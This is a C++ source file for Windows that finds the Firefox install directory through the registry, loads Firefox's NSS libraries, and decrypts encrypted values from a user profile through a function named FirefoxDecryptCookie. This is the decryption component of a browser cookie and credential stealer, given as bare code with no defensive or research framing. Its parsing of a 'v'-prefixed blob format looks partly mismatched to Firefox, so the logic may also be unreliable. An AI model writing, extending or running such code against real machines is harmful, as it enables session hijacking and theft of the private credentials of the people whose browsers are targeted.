

#include "main.h"
#include <windows.h>

namespace {

typedef int SECStatus;
#define SECSuccess 0

struct SECItem {
    unsigned int type;
    unsigned char* data;
    unsigned int len;
};

typedef SECStatus      (*NSS_InitFn)(const char* configdir);
typedef SECStatus      (*NSS_ShutdownFn)(void);
typedef void*          (*PK11_GetInternalKeySlotFn)(void);
typedef SECStatus      (*PK11_CheckUserPasswordFn)(void* slot, const char* pw, int pwlen);
typedef SECStatus      (*PK11SDR_DecryptFn)(SECItem* data, SECItem* result, void* wincx);
typedef void           (*SECITEM_FreeItemFn)(SECItem* item, int freeData);
typedef void           (*PK11_FreeSlotFn)(void* slot);

struct NSS3 {
    HMODULE                  hNSS3     = nullptr;
    HMODULE                  hNSSUtil3 = nullptr;
    NSS_InitFn               NSS_Init              = nullptr;
    NSS_ShutdownFn           NSS_Shutdown          = nullptr;
    PK11_GetInternalKeySlotFn PK11_GetInternalKeySlot = nullptr;
    PK11_CheckUserPasswordFn  PK11_CheckUserPassword = nullptr;
    PK11SDR_DecryptFn        PK11SDR_Decrypt        = nullptr;
    SECITEM_FreeItemFn       SECITEM_FreeItem       = nullptr;
    PK11_FreeSlotFn          PK11_FreeSlot          = nullptr;
};

NSS3 g_nss3;
bool g_loaded = false;
bool g_initd  = false;

std::wstring ReadInstallDir(HKEY rootKey, const wchar_t* baseKey) {
    HKEY hKey = nullptr;
    if (::RegOpenKeyExW(rootKey, baseKey, 0, KEY_READ, &hKey) != ERROR_SUCCESS)
        return L"";

    wchar_t version[64] = {};
    DWORD  versionSize = sizeof(version);
    LONG rc = ::RegQueryValueExW(hKey, L"CurrentVersion", nullptr, nullptr,
                                 (LPBYTE)version, &versionSize);
    if (rc != ERROR_SUCCESS) { ::RegCloseKey(hKey); return L""; }

    std::wstring mainKey = std::wstring(baseKey) + L"\\" + version + L"\\Main";
    HKEY hMain = nullptr;
    if (::RegOpenKeyExW(rootKey, mainKey.c_str(), 0, KEY_READ, &hMain) != ERROR_SUCCESS) {
        ::RegCloseKey(hKey);
        return L"";
    }

    wchar_t path[MAX_PATH] = {};
    DWORD  pathSize = sizeof(path);
    rc = ::RegQueryValueExW(hMain, L"Install Directory", nullptr, nullptr,
                            (LPBYTE)path, &pathSize);
    ::RegCloseKey(hMain);
    ::RegCloseKey(hKey);

    return (rc == ERROR_SUCCESS) ? std::wstring(path) : L"";
}

std::wstring FindFirefoxInstallDir() {

    std::wstring p = ReadInstallDir(HKEY_LOCAL_MACHINE,
                                    L"SOFTWARE\\Mozilla\\Mozilla Firefox");
    if (!p.empty()) return p;

    return ReadInstallDir(HKEY_LOCAL_MACHINE,
                          L"SOFTWARE\\WOW6432Node\\Mozilla\\Mozilla Firefox");
}

bool LoadNSS3() {
    if (g_loaded) return true;

    std::wstring ffDir = FindFirefoxInstallDir();
    if (ffDir.empty()) return false;

    std::wstring nssUtilPath = ffDir + L"\\nssutil3.dll";
    std::wstring nss3Path    = ffDir + L"\\nss3.dll";

    g_nss3.hNSSUtil3 = ::LoadLibraryW(nssUtilPath.c_str());
    g_nss3.hNSS3     = ::LoadLibraryW(nss3Path.c_str());
    if (!g_nss3.hNSS3) {
        if (g_nss3.hNSSUtil3) { ::FreeLibrary(g_nss3.hNSSUtil3); g_nss3.hNSSUtil3 = nullptr; }
        return false;
    }

    g_nss3.NSS_Init               = (NSS_InitFn)              ::GetProcAddress(g_nss3.hNSS3,     "NSS_Init");
    g_nss3.NSS_Shutdown           = (NSS_ShutdownFn)          ::GetProcAddress(g_nss3.hNSS3,     "NSS_Shutdown");
    g_nss3.PK11_GetInternalKeySlot= (PK11_GetInternalKeySlotFn)::GetProcAddress(g_nss3.hNSS3,     "PK11_GetInternalKeySlot");
    g_nss3.PK11_CheckUserPassword = (PK11_CheckUserPasswordFn) ::GetProcAddress(g_nss3.hNSS3,    "PK11_CheckUserPassword");
    g_nss3.PK11SDR_Decrypt        = (PK11SDR_DecryptFn)       ::GetProcAddress(g_nss3.hNSS3,     "PK11SDR_Decrypt");
    g_nss3.SECITEM_FreeItem       = (SECITEM_FreeItemFn)      ::GetProcAddress(g_nss3.hNSSUtil3, "SECITEM_FreeItem");
    g_nss3.PK11_FreeSlot          = (PK11_FreeSlotFn)         ::GetProcAddress(g_nss3.hNSS3,     "PK11_FreeSlot");

    if (!g_nss3.NSS_Init || !g_nss3.NSS_Shutdown ||
        !g_nss3.PK11_GetInternalKeySlot || !g_nss3.PK11_CheckUserPassword ||
        !g_nss3.PK11SDR_Decrypt || !g_nss3.SECITEM_FreeItem ||
        !g_nss3.PK11_FreeSlot) {
        ::FreeLibrary(g_nss3.hNSS3);
        if (g_nss3.hNSSUtil3) ::FreeLibrary(g_nss3.hNSSUtil3);
        g_nss3 = NSS3{};
        return false;
    }

    g_loaded = true;
    return true;
}

std::string WideToUtf8(const std::wstring& w) {
    if (w.empty()) return "";
    int len = ::WideCharToMultiByte(CP_UTF8, 0, w.c_str(), (int)w.size(),
                                    nullptr, 0, nullptr, nullptr);
    if (len <= 0) return "";
    std::string out(len, '\0');
    ::WideCharToMultiByte(CP_UTF8, 0, w.c_str(), (int)w.size(),
                          out.data(), len, nullptr, nullptr);
    return out;
}

struct BlobSlice { size_t offset; size_t length; };
BlobSlice ParseFirefoxEncrypted(const std::vector<uint8_t>& ev) {

    if (ev.size() < 4 || ev[0] != 'v') return {0, 0};

    size_t pos = 2;
    if (pos >= ev.size()) return {0, 0};

    uint32_t len = ev[pos++];
    if (len == 0) {

        if (pos + 2 > ev.size()) return {0, 0};
        len = (uint32_t)ev[pos] << 8 | ev[pos + 1];
        pos += 2;
    }
    if (pos + len > ev.size()) return {0, 0};
    return {pos, len};
}

}

bool FirefoxDecryptCookie(const std::wstring& profileDir,
                          const std::vector<uint8_t>& encValue,
                          std::vector<uint8_t>& plaintext) {
    plaintext.clear();
    if (profileDir.empty() || encValue.empty()) return false;
    if (!LoadNSS3()) return false;

    BlobSlice blob = ParseFirefoxEncrypted(encValue);
    if (blob.length == 0) return false;

    std::string profileUtf8 = WideToUtf8(profileDir);
    if (profileUtf8.empty()) return false;

    if (g_nss3.NSS_Init(profileUtf8.c_str()) != SECSuccess) return false;
    g_initd = true;

    void* slot = g_nss3.PK11_GetInternalKeySlot();
    if (!slot) { g_nss3.NSS_Shutdown(); g_initd = false; return false; }

    if (g_nss3.PK11_CheckUserPassword(slot, "", 0) != SECSuccess) {
        g_nss3.PK11_FreeSlot(slot);
        g_nss3.NSS_Shutdown();
        g_initd = false;
        return false;
    }

    SECItem inItem  = { 0, (unsigned char*)encValue.data() + blob.offset, (unsigned int)blob.length };
    SECItem outItem = { 0, nullptr, 0 };

    bool ok = false;
    if (g_nss3.PK11SDR_Decrypt(&inItem, &outItem, nullptr) == SECSuccess &&
        outItem.data && outItem.len > 0) {
        plaintext.assign(outItem.data, outItem.data + outItem.len);
        g_nss3.SECITEM_FreeItem(&outItem, 0);
        ok = true;
    }

    g_nss3.PK11_FreeSlot(slot);
    g_nss3.NSS_Shutdown();
    g_initd = false;
    return ok;
}
